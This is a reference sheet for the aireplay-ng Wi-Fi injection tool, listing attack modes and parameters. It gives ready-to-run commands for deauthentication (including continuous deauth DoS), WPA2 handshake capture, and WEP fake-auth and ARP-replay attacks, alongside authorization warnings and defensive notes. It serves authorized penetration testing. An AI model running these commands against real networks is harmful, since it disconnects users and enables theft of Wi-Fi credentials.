# aireplay-ng

- **Category**: Wireless / Traffic Injection
- **Risk Level**: 🔴 High

---

## Description

aireplay-ng is the wireless packet injection tool in the aircrack-ng suite. By injecting specific packets into a target network, it can accelerate data capture (WEP IV collection), force clients to reconnect (Deauthentication attack), capture WPA/WPA2 handshakes, and more. Requires an adapter that supports packet injection.

## Installation

```bash
sudo apt install aircrack-ng

# Test whether the adapter supports injection
sudo aireplay-ng --test wlan0mon
```

## Parameter Reference

### Attack Modes

| Mode | Parameter | Name | Description |
|------|------|------|------|
| 0 | `--deauth` | Deauthentication | Sends deauth frames to clients, forcing reconnection |
| 1 | `--fakeauth` | Fake Authentication | Fake authentication to AP (required for WEP) |
| 2 | `--interactive` | Interactive Replay | Interactive packet selection and replay |
| 3 | `--arpreplay` | ARP Request Replay | ARP request replay (WEP attack) |
| 4 | `--chopchop` | KoreK Chopchop | WEP Chopchop attack |
| 5 | `--fragment` | Fragmentation | Fragmentation attack (obtain PRGA) |
| 6 | `--caffe-latte` | Cafe-latte | Cafe Latte WEP attack |
| 7 | `--cfrag` | Client-oriented Fragmentation | Client-oriented fragmentation attack |
| 8 | `--migmode` | Migration Mode | WPA migration mode attack |
| 9 | `--test` | Injection Test | Test injection capability |

### Common Parameters

| Parameter | Description |
|------|------|
| `-b <bssid>` | Target AP MAC address |
| `-c <client>` | Target client MAC (destination MAC filter; for Deauth: omit to broadcast all clients) |
| `-e <essid>` | Target network SSID |
| `-a <bssid>` | AP MAC (for fake authentication) |
| `-h <mac>` | Local MAC address |
| `-x <pps>` | Packets per second (default: auto) |
| `-p <fctrl>` | Set frame control byte (hex) |
| `-r <file>` | Read packets from pcap file |
| `-i <iface>` | Input interface |
| `-s <smac>` | Set source MAC address |
| `-d <dmac>` | Set destination MAC address |
| `--ignore-negative-one` | Suppress channel -1 warnings |

### Deauth-Specific Parameters

| Parameter | Description |
|------|------|
| `-0 <count>` | Number of Deauth frames to send; 0 = send continuously |
| `-a <bssid>` | Target AP |
| `-c <client>` | Specific client (omit for broadcast, disconnects all clients) |

## Common Commands

### Scenario 1: Test Injection Capability

```bash
# Basic injection test
sudo aireplay-ng --test wlan0mon

# Test against a specific AP (more accurate)
sudo aireplay-ng --test -b AA:BB:CC:DD:EE:FF wlan0mon
```

### Scenario 2: Deauthentication Attack (Capture Handshake)

```bash
# Send 10 Deauth packets to all clients (force reconnect to capture handshake)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Send Deauth to a specific client (more precise, reduced impact)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Send Deauth continuously (use with caution — causes DoS)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Scenario 3: Full WPA2 Handshake Capture Workflow

```bash
# Terminal 1: Start capture (run this first)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/handshake wlan0mon

# Terminal 2: Send Deauth to force reconnection
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# When Terminal 1 shows "WPA handshake: AA:BB:CC:DD:EE:FF" in the top-right, capture succeeded
```

### Scenario 4: WEP Attack — ARP Replay

```bash
# Step 1: Fake authentication (must associate first for WEP)
# -1: fake auth, 0: reassoc timing, -e: SSID, -a: AP MAC, -h: local MAC
sudo aireplay-ng -1 0 -e TargetSSID -a AA:BB:CC:DD:EE:FF -h YY:YY:YY:YY:YY:YY wlan0mon

# Step 2: ARP request replay (rapidly accumulate IVs)
# Start airodump-ng capture first in a separate terminal!
# -3: ARP replay mode, -b: AP MAC, -h: local MAC
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YY:YY:YY:YY:YY:YY wlan0mon
```

### Scenario 5: Fake Authentication

```bash
# Fake authentication to a WEP AP (0=association delay, -e=SSID, -a=AP MAC, -h=local MAC)
sudo aireplay-ng -1 0 -e "MyNetwork" -a AA:BB:CC:DD:EE:FF -h YY:YY:YY:YY:YY:YY wlan0mon

# Keep association active (re-authenticate every 30 seconds)
sudo aireplay-ng -1 30 -e "MyNetwork" -a AA:BB:CC:DD:EE:FF -h YY:YY:YY:YY:YY:YY wlan0mon
```

## Notes & Tips

1. **Authorization required**: Use on unauthorized networks is illegal
2. Deauth attacks disconnect all online users and constitute a DoS attack — use with caution even in authorized tests
3. `-0 0` continuous Deauth mode is highly destructive; stop immediately when testing is complete
4. If injection tests fail, it is usually a driver issue — adapters like the Alfa AWUS036ACH are recommended for compatibility
5. WPA3 uses SAE (Simultaneous Authentication of Equals), limiting the effectiveness of Deauth attacks
6. If multiple Deauth packets have no effect, the AP may have Management Frame Protection (802.11w) enabled

---

## Official References

- [aireplay-ng Documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
